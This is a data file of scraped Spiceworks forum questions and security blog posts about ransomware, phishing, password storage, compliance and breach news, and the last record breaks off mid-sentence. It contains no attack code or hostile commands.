1287060,Bitdefender Releases Cryptowall 4.0 Ransomware Vaccine,"Right after a new, badder version 4.0 of CryptoWall came out, Romanian security company Bitdefender has released a vaccine they claim will block ransomware infections.Andra Zaharia of Denmark-based Heimdal Security stated that Cryptowall 4.0 is employing ""vastly improved"" communications and better code, so it can exploit more vulnerabilities. ""Cryptowall 4.0 still includes advanced malware dropper mechanisms to avoid antivirus detection, but this new version possesses vastly improved communication capabilities,"" Zaharia says. ""It includes a modified protocol that enables it to avoid being detected, even by second generation enterprise firewall solutions. ""This lowers detection rates significantly compared to the already successful Cryptowall 3.0 attacks.""Bitdefender said: ""The advent of ransomware in 2014 marked a turning point for the cyber-crime ecosystem. It poses one of the most dangerous threats to both consumers and organizations and ransomware writers have wielded it to extort more than $30 million in the Cryptolocker campaign alone. They’ve also destroyed user files such as database backups, source code, documents and spreadsheets that can be priceless assets for companies.""We have now developed a vaccine that allows users to immunize their computers and block any file encryption attempts, even if they become infected with CryptoWall, one of the most powerful clones of the Cryptolocker malware. As usual, we advise customers to run a fully dedicated Internet Security solution such as those provided by Bitdefender to protect against all threats. The CryptoWall Immunizer is only effective in protecting systems that may get infected with the latest version of Cryptowall ransomware, version 4.0. While we are making all efforts to update the tool as soon as Cryptowall is modified, we recommend that you keep your antivirus solution always on and use this tool as an additional layer of protection.""  You can download the code here.We have the vaccine running on some machines but have not had a chance to test this in our lab yet. Bitdefender has a very good reputation in the industry though, and comes recommended. I have all my machines at the house running it. Having an extra safeguard against ransomware is a great idea, the current version looks like it was made for consumers though, it has no centralized management yet. And of course, having a ""human firewall' made up out of well-trained end-users is a must these days. Effective security awareness training will provide a necessary additional security layer.

What brand of firewall do you have?2. When you put in an allow rule for a broad range of IP addresses specifically a /24 and /19 subnet does your firewall make you specify the subnet or does it figure it out and calculate it for you? With a /24 range of IPs that's the standard 255.255.255.0 subnet but the /19 is 255.255.255.224.I'm just trying to do some research for an issue that I'm dealing with and it just appears to be in relation to a /19 subnet. I'm just curios if the firewalls people are using are just populating a 255.255.255.0 subnet when people put in the /19 and they need to go in and change it to the correct subnet.Your help with this would be very much appreciated!Thanks!Randy,0

1896303,"82% of Email Servers are Misconfigured, Allowing Domain Spoofing","We reviewed thousands of domains that have been through our domain spoof test and analyzed more than 10,000 email servers. We found that 82% of these are misconfigured. What do we mean by misconfigured?One of the most common security issues – spoofing – is frequently set up incorrectly, allowing a cybercriminal to impersonate an employee, or worse, a key executive. We've worked with thousands of IT managers to determine whether their servers allow spoofed emails to enter an organization disguised as coming from a company’s own domain. Those that are set up incorrectly allow phishing attacks in, making the companies an easy target.Here's how cybercriminals exploit the issue:A typical scenario is a spoofed email that looks like it comes from the IT administrator or “IT” asking an employee to update their email account credentials. The uneducated employee fills out their username and password credentials thinking they are complying with a request, missing the telltale signs of a phishing attack with a spoofed email address. This can lead to any number of nefarious scenarios, including a ransomware attack where all computers on the company network are hijacked.Why does this matter?Ransomware has nearly doubled in the first half of 2016, and phishing emails are the top vehicle used to spread the rapidly evolving threat. Many IT managers and executives are realizing that outdated security techniques will not combat today’s more sophisticated cybercriminal. It is vital that businesses deploy a defense-in-depth strategy with effective security awareness training for all employees from the mail room to the board room included as part of the outer layer, along with policies and procedures.What can be done to stop this?Adding security awareness training as part of a defense-in-depth program creates a ‘human firewall’ that is a highly effective part of defending against social engineering attacks. When spoofed phishing attacks make it through the filters, your users are a critical part of your defense. Training employees to make better security decisions helps mitigate the risk of social engineering.We use a number of customizable email templates for simulated phishing attacks on users. Out of more than three million simulated phishing attacks sent out in Q3 2016, here are the top ten phishing subject lines that employees are most likely to click on:We want you (and your users) to use safe security practices all year long, not just during Cyber Security Month. Security awareness training and simulated phishing programs can help strengthen the human firewall, find out how this works.https://info.knowbe4.com/kmsat-request-a-demoWarm regards,Stu",0

I spoke to a support engineer about the traffic which he advised is not guaranteed to be blocked by our device.

1963199,4 Things You Should Never Store in Your Database,"Databases are mainly used to support various business-critical applications. They can store many kinds of data. However, there are some things you should never keep in a database.These basic database security techniques will help protect your data:1. Unsecured CredentialsThis is probably an obvious point, but it’s not a good idea to store plain text passwords in your database.If a hacker gets access to the data in this table, he or she has a list of all passwords for all users. These passwords are in plain, readable text, which can be used to log in to the system as though the hacker were that user. This might not seem like a big deal: If the hacker has already accessed the system, why would he or she need a login? The problem is, people often use the same password for many accounts. If a hacker has user names and passwords, he or she can use that information on other sites. So, how do you get around this issue? Encrypt the password before storing it. This process is often called “hashing” and can also be combined with “salting.”Hashing involves applying an algorithm to an entered password, which encrypts it. It can then be stored in the database. To check against this password, the system can perform the same hashing process against whatever value the user has entered and can check the output against the stored hashed value previously entered (the correct password). Many programming languages have a built-in functionality to perform this for you. Long story short, don’t store plain text passwords in a database.2. Logs or Log FilesIt can be tempting to store log information inside of a database. If it’s in a database, it’s easy to query and analyze.However, storing log information in the database means it can be accessed by hackers if they get to your tables. It can uncover all kinds of information about your system. It’s better to store the log information in separate files in the file system. Not only does this free up system resources but it makes it harder for the hackers to access log files.3. Files Such as ImagesDatabases allow you to store files within tables in the database, such as images.Now, while you can create tables and columns to store files (such as Oracle’s BLOB data type), it doesn’t mean you should. Storing a file in a database table means you need to use database logic (and possible application logic) to access the file. This increases the size of your database and degrades its performance. It also makes backups and data corruption harder to deal with. A better approach to storing files and images is to use the file servers. That’s what they’re made for. Doing so allows for faster file access, easier file metadata access, and easier backup and restore functionality.4. Credit Card DataFinally, you shouldn’t store credit card information in your database unless you absolutely need to.This includes credit card owner names, numbers, CVV numbers, and expiration dates. There is far too much risk involved. If a hacker gets access to credit card data from your system, it has a big impact on your company and your customers. You also need to be externally audited to make sure you comply with strict standards—namely PCI DSS—if you store credit card numbers. This creates more trouble for your IT department and means additional expenses. A better approach is to use an existing solution, such as Authorize.net or PayPal. These organizations have already developed the software, proved their compliance, and many other companies already use and trust these companies. It’s better to avoid storing credit card data at all. Doing so is not worth the risk, and other companies do it better.",0

In the end of December she had her phone and/or gmail account hacked into and has been unable to access her gmail account since. A gmail account she used for her work as she's self employed.She replaced the first phone (a android device) with another and a different email account only to have the email account and her phone also compromised then replaced it again with another android device and another email account only to have that one also compromised. She then switched to a iPhone recently and things have been OK thus far, but she's frantic and seriously upset.I planned on getting her in touch with Legalshield as they have a identity theft program as well and then taking her devices and sniffing the traffic on them in a attempt to trace traffic. I also planned on contacting Google to see if I can get her back into her email account and also hopefully figure out where the source of the logins where coming from.Does anyone have any suggestions as to how to proceed to get her back into her GMail account and/or who else to contact to get such issues resolved?I have a meeting with in in a couple days to go over everything and get more detail but I'm wanting to get a head start and how to best go about fixing her problems and hopefully figuring out who targeting her and making her life difficult.Obviously making sure her network and devices are properly secured is a #1 priority so as to stop the hacks as best as possible.",0
250212,Certifiably secure: Notes from the trenches,"This is the 88th article in the Spotlight on IT series. If you'd be interested in writing an article on the subject of backup, security, storage, virtualization, mobile, networking, wireless, DNS, MSPs or printers for the series PM Eric to get started.Public sector organisations are now moving to more formal certification around security, and the UK seems to be leading the charge. Along with a requirement for ISO 27001 — a formal, certifiable standard for creating and maintaining an information security management system — within the UK G-Cloud buying framework, organisation security policies are tightening to common standards within national and local government groups.The company I work for, Objective Corporation, is an Australian-headquartered specialist provider of proven content, collaboration and process management solutions for the public sector. We have offices around the world, including Maidenhead, UK, where I work. Given the fact that the UK office is the second largest coupled with the drive here to adopt ISO 27001, it was decided we would start our global ISO 27001 program.So, what have we learned from this and how have things changed since we’ve moved to a formal security management program?We’ve been ISO 9001 (Quality Management System) certified for almost four years now. This laid some solid groundwork to be used as a foundation for the ISO 27001 program. The main similarity is the “Plan-Do-Check-Act” continuous improvement cycle, which is one of the common processes between the two ISO system management methodologies. That is:Plan what you’ll doDo the planCheck for things you can do betterAct on the suggestions for a new round of planningFor your initial plan, any good information security (infosec) course or certification will start you at the policy phase. Decide what you are trying to achieve and put it down in 1–3 pages (non-technical). This should get signed off on by the CEO and reviewed at least once a year. Don’t confuse policies with controls, baselines and standards. Policies are implemented by controls, baselines, and standards and should be separate documents.Next the audit phase. Know what you have, who owns the resource and who looks after it. For example, a system administrator may run the finance server on a day-to-day basis, even upgrade the software, but who is the individual responsible for the data on that system? In this case it’s more than likely the CFO/finance director.Next, look at the risks to that information asset. Risks can be roughly calculated by looking at the threats against the asset (e.g., theft, fire, incorrect access, information being published in the local newspaper) multiplied by the impact of that threat multiplied by the likelihood. This gives you a risk factor.Risk factor = Threat x Impact x LikelihoodOnce you have the risk factor you can concentrate on the protection of the risk — mitigating the overall risk. ISO27002 is a good guide here and gives you some usable controls to look for when choosing how to mitigate the risks. Controls also need to match policy. Once you’ve gone through the mitigations, recalculate the risk using the same equation and you have residual risk.Now you can look at the high numbers you have left and decide if this is acceptable given any costs you may have to spend on reducing these risk factors further.You may also want to think about different controls depending on the sensitivity of the data. For example, HR data should be more tightly controlled than marketing information. Labelling the data due to its confidentiality and having a placeholder for the confidentiality in document templates helps people think about this.Role-based access is also a recommended route: Create groups for access control mechanisms rather than assigning access to an individual. People move about organisations, and it’s much easier to maintain based on the roles than constantly adding and removing user IDs to access lists. Also, review the users access rights regularly. Do they still need access to write to marketing data if they now work in the shop floor?All the controls you’ve put in place now need to be documented as part of the overall policies and management controls. You’ll need to be able to show any auditor you’re actually following these controls and be able to speak knowledgeably about these controls in your area.But how can I show I’m following a control, you ask? Well, first of all you have the policy. Let’s use an example like “All computers must be running anti-virus.” Using Spiceworks I can quickly generate a report of any computers not running our AV corporate edition.How can I track if I redeploy a machine? That’s easy: Besides the tickets showing return of the asset from a person and the deployment/build out to another person, Spiceworks still sees that device and all the history based on the service tag number.When we can prove we are following the procedures by utilising tickets and device history/audit it makes for a very happy (and impressed) assessor.Some of the more challenging parts are that right now our scope only covers the UK, but much of the code base and support is from within Australia with only a small proportion of developers based in the UK. This makes any hosted solution we support less of a dev-ops opportunity — though Australia is seen as a friendly nation to the UK, once we start entering central government requirements, the nationality of people who can access the data becomes important. So we have to be quite careful as to how the controls and risk here are managed with more control falling back to the UK than we would necessarily like to resource.Training is also important, not only for the users as to why these new working practices are coming in, but for developers around such frameworks as OWASP for building online solutions, HR for best practices around policy and verifying identify of employees (e.g., passport checks) but also the systems administrators and the new security managers. In order to bring the designated security manager (me!) up to speed, I sat through the CISSP course and exam. This was probably the hardest thing I’ve ever done workwise even though I’ve had more than a passing interest in infosec for the last 20+ years. But that’s another story…",12
397896,Do you manage workstation admin passwords with Spiceworks?,"I'm the sole user of a locally hosted copy of Spiceworks and considering migrating all my asset tracking to it.  Up until now I've been tracking all assets in an Access Database that's password protected and stored within a TrueCrypt container on a department specific network drive. The only concern I'm running into is that I've been using unique admin and bios passwords for each machine and logging those in the Access database.  If I migrate to Spiceworks I'd like to keep everything in one location but not sure about storing these passwords here.I've browsed some of the older threads and some people have suggested things like keepass or other password managers and I was wondering how other people manage these types of passwords.I'm not looking to store user passwords, only items specific to a piece of hardware and only available to myself. With something like KeePass it looks like i could store a master database in the truecrypt container and then export individual passwords to Keypass file and attach that to the inventory entry for a particular asset, but that seems like it may be a bit too combursome. ",0

I have proposal to replace my 610 appliance with virtual 610 vx vms running in VMWare 6.0.  The 610 vx vms would work through WCCP to a pair of Cisco ASA 5516x firewalls.  However, in talking with Barracuda, and in doing some research, it appears that the 610 vx through WCCP only filters for HTTP and HTTPS, and leaves out all the neat application packet filtering that the inline 610 hardware appliance performs.  I've also considered putting the 610 vx vms as an HTTP/HTTPS proxy behind an older SonicWall firewall, however, the same lack of complete application filtering applies as well.Is the lack of inline packet content filtering a large security hole?  Or am I being over protective?  Should I be relying on the Barracuda for HTTP/HTTPS filtering, then adding something else for non HTTP/HTTPS filtering?All comments/suggestions are appreciated.Thank you,Doug",0

We are currently trying to prioritize the different options we should follow.Ask the customer to provide us with the specific IP and port to connect, and have them open the firewall for the communication coming from our IP address, and limit it to the specific station/s.Ask the customer to install a VPN provider we support on their side and use that to log into the station.Support a list of VPN vendors that our customers might use, and ask the customer to provide credentials.Develop an appliance that will ""sit"" on the customer's network, and have this appliance initiate the communication.We have some more but that's those are the leading directions. The main concern we have with options 2 & 3 is that it will give us access to the entire customer network and not just to a specific station, and it will give the customer access to the network we are communicating from.It seems to me that the best approach should be option #1, which is what we would like to follow but the question is will organizations accept it and are we putting them in any risk?Thanks,Eitan﻿",0

457714,"Possible Bitcoin mining malware and spoofed ""Apple Updater""","Starting a couple of weeks ago, our company (about 100 employees in total) which is managed by one system admin and one intern (myself) started getting complaints of blue screens and random shutdowns. Almost all of our machines are laptops, Dell E6320, 6400, 6410, and some new 7440s. We noticed that the machines would be running very hot and checking the system logs, they shut down due to overheat protection. So we initially thought just coincidentally, some heat sinks / fan assemblies had failed. One had a failed HDD likely due to the heat.The next week, we get more of these, and upon further investigatin and some notification emails from Dell Secureworks, we were notified of ""possible bitcoin mining activity."" We then investigated further and found that every affected computer had a task called ""Apple Software Update"" set to run at startup. At first glance it looks like a legit Apple product, but upon reading the details, it looks more sketchy. The punctuation in the description is weird and it uses UK english, and is version ""1.0.0.0."" All of the machines we found this on had it installed around the same time, about 11 laptops thus far.We found a .exe in the programfiles folder related to this, so I deleted it and the tasks. I also noticed a very large amount of blocked activity in the Symantec activity log, blocking incoming and outgoing traffic from two IPs. Does anybody know anything about this? I am worried there is still bits and pieces of it around that could still be active. Thanks -JB",0

Then there is the main database and apparently every so often or some sort of replication the first database syncs to the main database. I know you want to isolate the database from the web, etc, but I thought that was more a firewall, VLAN, LUN, etc. issue so that no access occurred directly to the database (besides maybe a DBA performing queries, etc.) The way I see it if you are syncing the two dabases then you may as well just have the one database (except maybe in a cluster, etc) as whatever gets deleted, compromised would probably also be replicated to the main databse.  ",0

Moreover, they all are using their personal devices, which cannot be controlled at all by us (we don't know even if they lock the device). I have been wondering if wickr pro is a good solution, since we can enforce some policies, like autowipe of images and messages, full encryption, and force login each time the app is opened (which could reduce the risk of use in non controlled devices). But on the other hand, the user can still save the document deciphered in his device, and share it easily by other ways (i.e. e-mail).I was wondering how companies with high security standards do to collaborate with external parties?

1058338,Video Game Day – Best Practices for Attacking Cyber Criminals Trying to Ruin You,"On July 8, enthusiasts have the perfect opportunity to indulge in their favorite games and celebrate the evolution of their favorite pastime.In recent years, games have evolved from text-based games on PCs to consoles and now include mobile devices. These sophisticated platforms have revolutionized the way we play and interact with fellow gamers around the world; however, this interaction brings opportunities for identity theft.Consider that by 2016, an expected 1.2 billion online gamers worldwide will be connected. Cyber criminals view this access as a gold mine of opportunities to take advantage of unsuspecting gamers. Since their information is often stored in a cloud-based system to easily link consoles and devices, gamers are a prime target for valuable information to be sold in underground markets.Also, there will be attempts to phish for virtual gaming assets. Once stolen, these assets can be sold for quick cash. If that’s not enough, cyber criminals will often spread malware onto a gamer’s console to gather sensitive information or gain access to their personal network.If you’re a gamer, it’s essential for you to stay alert to the vulnerabilities presented by modern-day, always-connected gaming consoles. You need to be proactive in protecting both your private information and your gaming assets.Be sure to stay safe with these quick tips:Use a separate email account to register for games so hackers can’t access your address book, contact information and verification details from your primary email.When signing up for a gaming account, decide what information is important to keep accurate. There is no need to correctly fill in details that will not interfere with your gaming experience, including your real name, address and birth date.Do not link your credit or debit card information to any gaming account if you do not plan on buying in-game items. If you need to make purchases within a game, ask your card provider about verification services for online transactions.Some games support two factor authentication. Make sure you enable it.Before you hand over your personal information or payment details, make sure you are on an official site by double-clicking links and branding marks.Be aware that connecting your console to your home network may lead to cyber criminals snooping in your system.Install reliable security software that can also detect malicious links and spam, and regularly scan your system to make sure that your system is malware-fee.Don’t let cyber criminals ruin your gaming experience. By taking proper precautions, you can reduce the risk of being a victim. This is an exciting time to be a gamer, but there are pitfalls. With a little preparation, you won’t miss a beat!To my fellow gamers, have a Happy Video Game Day and stay proactive in keeping your prized gaming console safe this year!Please add your thoughts in the comments below or follow me on Twitter at @GavinDonovan.﻿",11

To ensure security governance, passwords on networking devices should be changed every time a member of staff with access to the networking devices leaves.A security analyst said a key to improving security is raising awareness among users of its importance. He also recommended using ID badges that can act as security tokens – though presumably not the same kind of badges recently exposed as insecure at DefCon.",5

1986978,U.S. Court Sentences Russian Hacker to a Record-Setting 27 Years,"On Friday, a Seattle Federal District Court judge sentenced 32 year old Roman Valerevich Seleznev  to 27 years in prison for running a vast credit card and identity theft operation, selling millions of credit card numbers on the black market. This was the longest sentence handed down for hacking-related charges in the United States.Seleznev’s schemes led to losses of at least $170 million. Among Mr. Seleznev’s victims were 3,700 financial institutions and 500 businesses around the world, including several restaurants in the Seattle area. Seleznev is the son of Valery Seleznev, an outspoken member of the Duma, the lower house of the Russian Parliament, and a close political ally of President Vladimir V. Putin of Russia. Up to now, US law enforcement has had very little cooperation capturing and convicting Russians accused of hacking crimes. Russian cybercriminals can operate with impunity as long as they do not hack inside Russia itself. In return for that relative freedom, cybercriminals are often tapped to work for Russia’s intelligence agencies.Next time, stay homeOnly when Russian cyber criminals are dumb enough to travel outside of Russia that US law enforcement is able to detain them, most recently in Prague and in Barcelona. However, Secret Service officials say more than three dozen Eastern European hackers suspected in crimes remain out of reach.Seleznev never traveled to any country that had an extradition treaty with the U.S. For more than a decade, the Secret Service tracked his movements around the globe but couldn't do anything about him.Then Summer 2014, Seleznev and his girlfriend took a vacation in Maldives which doesn't have an extradition treaty with the U.S. either, but the US State Department convinced local authorities to help capture Seleznev anyway. He was arrested by Malidivian police at the airport on his way home and handed over to U.S. officials, who whisked him by jet to Guam and then to a federal prison in Washington State.Seleznev wrote an 11-page letter (PDF) by hand to the court this year, admitting to and apologizing for his crimes. “Today is a bad day for hackers around the world,” said Annette L. Hayes, the United States attorney for the Western District of Washington. “The notion that the internet is a Wild West where anything goes is a thing of the past.”That's great PR of course, but the reality is that Vladimir Putin uses hackers for his own nefarious purposes, and will provide them air cover as long as they behave and go for a ""staycation"" instead of tropical islands.",0

We are running into a stumbling block while trying to disable medium and low strength ciphers. Currently we have gone through the Microsoft documentation to disable all ciphers below 128 bits.   For some reason, we keep failing the scans based on TLSv1 ciphers: RC4-SHA and EDH-RSA-DES-CBC-SHA. We have tried everything we can think of to disable these ciphers, but are having no luck in finding where to do that.   We are running two Windows 2003 Servers (one with IIS) and have adjusted the registries to disable all ciphers except SSL3 and TLS (including everything listed under 128 bit).   Has anyone run across this problem and found a way to resolve it?

1991395,Thank you Spiceworks - Attempted breach prevented,"   Quick background, currently I'm the IT Help Desk/whatever.  The business is just finishing a migration to Office 365 and disabled the last of our old exchange servers and the old DC.    Today a large majority of our accounts were being locked.  Being new to this environment, and under trained, I start by chalking this up to a communication issue to the new DCs. After chasing this rabbit through the warren, I was forced to the conclusion that the DC was fine, communication was fine, and nothing was wrong.  Except more accounts were being locked.  Came back to Spiceworks for a review of issues.  Many of your responses from on previous problems pointed to using the Microsoft and Netwrix lockout tools.  Between the two of them I determined one computer was hitting one DC.  Digging through the security logs for the computer, I was able to track down its IP.  Forwarded this to my boss who has now blocked it.     End of one headache, and a valuable lesson.  And a major thank you to the community for the support you provide.",0

2173011,How to Spot if You've Been Hacked,"It’s been one of those bad tech days. Your phone that was on its last legs just went dead. You lost the charger for your tablet, and your laptop seems to be running slower than usual. Is that about to break, too? Well, since you bought it a year ago, the chances of it being on its last legs should be quite low. Can it be chalked up to a poor connection? Possibly. But you’re sitting right next to your router, and the weather is clear. Your next instinct tells you that you’ve been breached. Is that really the case, though?Here are a few sure-fire ways to tell your system is under attack:1. Your machine slows downYou were right to assume you may have been the victim of a cyberattack by the speed of your machine. You may even notice an odd lag happening while you’re working offline. Even though you won’t notice it right away, malware and other malicious software operate by running in the background of your gadget, meaning they eat away at your resources while the device is running.Another sign of these viruses running behind the scenes is your data usage. If you notice it’s been higher than usual, it’s likely some sort of worm causing your device to visit sites and click ads without your knowledge.2. You lose control on and offIf your cursor is jumping and seems to have a mind of its own, this may signal that a hacker is infiltrating your device. You may also try typing or using other functions that start acting unusual, indicating a breach.3. You can't perform updatesMalware is often to blame if you’re unable to update your anti-virus software and sometimes even your OS.4. A password you know inside and out no longer worksYou’ve typed it in once and typed it in again with extra care, and it still won’t let you access your account. This is a good indication that a hacker breached your system and changed your password to prevent you from gaining access to your account.Plus, if you notice messages and or emails in your sent box that you didn’t actually send, you’ve definitely been breached.5. Your device suddenly restarts Generally, if your system is performing an automatic update, it will inform you in a pop-up or message before shutting down. If your device restarts without any prior notice, you’ve likely been breached.Sometimes, the best defense is a good offence. Make sure you have an effective backup and recovery plan in place in case your device suffers a cyberattack.",11

360817,LLoyds: Cyber Risk Rises from 12th to 3rd place In Three Years,"You all know the world famous insurance company LLoyds. What you may not know is that they maintain a list of Top Risks.

Business leaders have woken up to the importance of cyber security following a series of high profile incidents since 2011.The report asks the question if organizations ""are spending money on the right things"" to effectively address cybersecurity, and (interesting for an insurance company) states that it's smarter to spend budget on security measures and implementation than purchasing a cyber insurance policy.I guess it's a matter of time before insurance companies will require a list of security measures to be in place before you can get any kind of liability insurance.",11
2128402,Disable Motion Sensor NetAXS 123,"Hi all. I inherited a NetAXS 123 system when I started my current position three years ago. Until a month ago, everything was set up so that all of the doors, save the server room door (which remains locked 24/7), opened at the start of business and locked at the close of business. A month ago, an edict came in from corporate that all external doors will be locked 24/7. I changed everything to fulfill that order and things have been fine. Except that we have motion sensors on each door that energize the door locks when they detect someone moving inside. I hadn't really thought about it, but it was brought to my attention today that this probably isn't ideal, since someone coming to a door and ringing the bell can magically just open the door if someone inside goes to look through the peep hole to see who is there.I need to figure out how to disabled the motion sensors on some of the doors. I don't see any mention of motion sensors in the NetAXS startup guide. And I don't see anything related to motion sensors in the web GUI (I would expect it to be in the egress section, which it's not, but I don't see it anywhere else, either). Does anyone know how to do this? Any help would be greatly appreciated.Thanks,Sam",0

2157260,"Healthcare Sees 278% Increase in Data Breaches, 30% Caused By Repeat Offenders","It’s not good to be in Healthcare IT these days, judging by the latest data. With over 3 million records put at risk by both insiders and external attacks in Q2, healthcare orgs need to be vigilant.The Q2 2018 Breach Barometer report from Protenus paints a bleak picture for the security of health data. If you’re in healthcare, you should be concerned.What’s worse is that about 30 percent of those breaches were caused by repeat offenders from within the organizations. It highlights a continued issue facing the sector: Risk accumulates over time when proper education and reporting do not happen. Some of the Q2 2018 findings include:142 Data Breaches (up 29% over Q1)3.1 million records (up from 1.1 million in Q1)Healthcare worker-related breaches are up 272%To make this worse, nearly 30% of healthcare organizations experienced more than one data breach. According to the Protenus report, organizations that do not detect and mitigate the first breach have a greater than 30% chance of having another breach within 3 months, and a 66% chance within 12 months. In other words, if the organization isn’t educating users on appropriate use, monitoring for policy violations, and addressing breaches – even minor ones – the odds are the problem will only compound. Additionally, the problem is exacerbated by insider infractions – 9 out of every 1000 employees breach patient privacy, mostly snooping around the records of family members.So, why is Healthcare seeing so many data breaches?There are two issues found within the Protenus data:Not enough staffing – on average, only 1 investigator is assigned to 4000 EHR users across 2.5 organizations, making it nearly impossible for healthcare organizations to stay on top of monitoring user behavior.The complete lack of a security culture – The snooping and repeat breaches clearly demonstrate that users are not educated and instilled with a need to preserve corporate security. In fact, 78% of healthcare organizations have inadequate data privacy and security awareness training in place.Improving the number of investigators may be tough – some organizations are leveraging third-party investigation services, making it cost-ineffective to have someone full-time monitoring user activity. What healthcare organizations need to do is focus on the part of the problem they can definitely address – the security culture. By establishing Security Awareness Training, healthcare organizations can communicate their expectations of the users around data security, snooping, and interaction with email and the web (both entrance points for external attacks). By doing this, they can reduce the likelihood of successful malware attacks used to gain access to the network, insider threats, and inquisitive workers looking to take a peek at a patient’s records.",0

2133393,"In regards to PCI compliance, OpenVPN to me seems to be MFA out of the box...","As PCI compliance reads, MFA is required to fill at least two of the three below points (but has to be two different options - a) Something you know, such as a password or passphrase. This method involves verification ofinformation that a user provides, such as a password/passphrase, PIN, or the answers to secretquestions (challenge-response). b) Something you have, such as a token device or smartcard. This method involves verification of aspecific item a user has in their possession, such as a physical or logical security token, a one-timepassword (OTP) token, a key fob, an employee access card, or a phone’s SIM card. For mobileauthentication, a smartphone often provides the possession factor in conjunction with an OTP app ora cryptographic material (i.e., certificate or a key) residing on the device. c) Something you are, such as a biometric. This method involves verification of characteristics inherentto the individual, such as via retina scans, iris scans, fingerprint scans, finger vein scans, facialrecognition, voice recognition, hand geometry, and even earlobe geometry.So if a user logged onto a laptop with their domain account username and password then logged onto a VPN with different a username and password this wouldn't be MFA (because even though they are different you can't use an option twice) BUT with OpenVPN a certificate is required on the device for it to work which covers point b) which states ""ora cryptographic material (i.e., certificate or a key) residing on the device"" which would mean that this would be PCI compliant.This would give you a username and password onto a encrypted device, which would hold a certificate for an OpenVPN service (so that's point b), which would then require a different username and password to enable (which would be point a).How do others feel about that?

I was asked to find a company that would make sure the documents (ie tax returns, loan documents…..) were secure and that were easy and convenient for the clients (I know….my boss actually used the words secure and convenient in the same sentence)My biggest concern is security.  The thing I've run into is several of these companies say they use 256-bit EV SSL encryption.   I get how that works on websites - but what about email?  I sent myself several test documents to sign and for each company I tried (2 so far) I received a confirmation email (as the signer) with a direct link to the document itself -  no login or second tier security required.  How is THAT secure?  So my question is….1. does EEV SSL encryption go beyond the website and actually protect the emails that are generated from the website?? 2. Can anyone recommend a good secure e-sign company?  Not just documents being secured from tampering and all that - but documents secured from prying eyes period!Thank you!",0

1516865,TeamViewer Denies It Is Ransomware Infection Vector,"A modified version of EDA2, an open source ransomware strain developed by Turkish computer engineering student Utku Sen, --by the way, thanks Utku, that was a very smart idea-- has been encrypting files and appending the .surprise extension to them. The cybercriminals using the Surprise ransomware have chosen an unusual infection vector: the popular remote control tool TeamViewer. The first time this was mentioned was in a forum post on Bleeping Computer on March 9th, and as more machines got infected, victims were able to upload the malware executable to the forum for analysis. When the string was pulled, it turned out that all of them were using TeamViewer v10.0.47484.“Moreover, the analysis of TeamViewer traffic logs showed that someone had remotely executed the surprise .exe process on computers, which resulted in malware injection behind the scenes,” noted PrivacyPC’s David Balaban. Another wrinkle is that more than one user ID was used to infect systems, and that in some cases the box had been owned for months.﻿People were suggesting this could be caused by a TeamViewer data breach but that does not necessarily follow. TeamViewer PR Manager Axel Schmidt denied it: “We looked thoroughly at the cases that were reported to us. According to our investigation, the underlying security issues cannot be attributed to TeamViewer. Thus far we have no evidence that would suggest any potential security breach of TeamViewer that attackers exploit.""Furthermore, a man-in-the-middle attack can nearly be excluded because of TeamViewer’s deployed end-to-end encryption,” he wrote in a public statement. ""Additionally, we have no reason to believe that a brute-force attack is the origin of the reported infections. TeamViewer exponentially increases the latency between connection attempts. It thus takes as many as 17 hours for 24 attempts.""Sounds like they have reasonable security measures in place. So what can cause this?Well, TeamViewer brings up a good point: carelessness of users who use the same password across multiple accounts with various suppliers. Alex Schmidt continued: “As TeamViewer is a widely spread software, many online criminals attempt to log on with the data of compromised accounts, in order to find out whether there is a corresponding TeamViewer account with the same credentials. If this is the case, chances are they can access all assigned devices, in order to install malware or ransomware.”They came up with some very good advice, something we have advocated here for years: use unique and strong passwords for all your user accounts.  They also recommended to protect TeamViewer accounts using their two-factor authentication, which is something you should do for all your critical logins like email, banking and sites that contain personal, confidential information like your healthcare data. I'd recommend to check with these types of sites if they provide two-factor authentication and if they do not, use another provider that does. ﻿Blog post with screen shot and links here:https://blog.knowbe4.com/teamviewer-denies-it-is-ransomware-infection-vector﻿",0

1888876,The Biggest Buzzwords of 2016 - and their definitions,"Hey! As you may have heard, we here at Barkly are really excited for Spiceworld. In addition to a bunch of cool stuff we're going to have at our booth (shamless plug: come say hi!) we're also going to be playing Buzzword Bingo: https://community.spiceworks.com/topic/1880102-going-to-spiceworld-play-buzzword-bingo-with-barkly (basically you print out a bingo card, check off when you see buzzwords and if you get bingo you get a bonus Barkly sticker (in addition to the other free stuff we'll have there). So, to help you started, and to help you figure out which areas will give you what buzzwords, we've put together a little guide for the biggest security buzzwords of 2016 and, what we think are their definitions: 1) Advanced persistent threatsWhen somebody gets onto your system and sits there watching everything you do, collecting information on your keystrokes, your credentials, and your network traffic, it’s called an APT. Is it persistent? For sure. Is it a threat? Well, you’re already in trouble, so the threat is now a reality. Advanced? Not necessarily, but you aren’t going to tell your boss you got owned by a “Simple Persistent Threat”.2) Anomaly detectionYou know you users and your network. And your users and your network would never act like that…or would they?3) Artificial intelligenceCatch-all for decision-making products that may or may not be smarter than the average bear (or admin).4) Behavioral analysisA range of techniques for detecting malicious activity — from spotting the initial indicators something bad is happening (are you about to sneeze on me?) to identifying the unfortunate effects (...and now I need a new shirt).5) Big DataA haystack of information waiting for the right magnet to find a needle. Formerly known as “Too Much Data”.6) Bring Your Own Device (BYOD)aka Break Your Own Defenses. Personal devices are the cause of most migraines for the brave folks who have to secure them and hope the bad data hygiene of their owners doesn’t come back to bite them.7) Cloud-basedIt’s on a server, just not your server.8) CyberA handy way of making any word suddenly refer to the online world (ex: cyber crime, cyber sleuth, cybernaut), which either makes the word a lot cooler or a lot lamer, depending on who you’re talking to.9) Data-drivenCheck the numbers. If the numbers say you’re doing good, report them to your management. If the numbers say things aren’t great, look at more numbers to see how to improve them.10) Defense in depthAcknowledging no security solution is capable of providing 100% protection, defense in depth is the traditional means of layering different types of solutions to increase your odds. Think belt plus suspenders (but much more complex to manage).11) DisruptiveThe marketing person was told to stop saying “next gen”.12) Endpoint detection and response (EDR)Solutions that report on bad things happening on endpoints, and help you investigate and clean up the mess.13) Endpoint protection platform (EPP)Anti-virus platforms expanded to include other, non-virus-related tools in order to provide sufficient value to their established customers.14) Internet of Things (IoT)Vint Cerf once said that every lightbulb would eventually have an IP address. IoT is a leap in that direction, with non-computing devices like stoves, electrical meters, thermostats, pacemakers, and cars all becoming wired (and therefore vulnerable).15) Intrusion detection/prevention (IDS/IPS)An alarm system for your network that too often works like the alarm system for cars in parking garages. They’re generally designed to either detect “bad” user actions/traffic or deviations from known “good” patterns (anomaly 